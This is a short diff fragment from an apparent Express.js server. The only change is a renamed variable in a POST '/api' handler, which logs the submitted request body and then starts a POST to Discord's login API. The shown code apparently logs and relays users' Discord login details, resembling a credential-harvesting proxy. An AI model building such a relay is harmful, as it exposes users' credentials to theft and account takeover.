@@ -21,8 +21,8 @@ app.get("/", (req, res) => {
 });
 
 app.post('/api', (req, res) => {
-  const data = req.body;
-  console.log(data);
+  const info = req.body;
+  console.log(info);
 
   fetch("https://discord.com/api/v9/auth/login", {
       method: "POST",
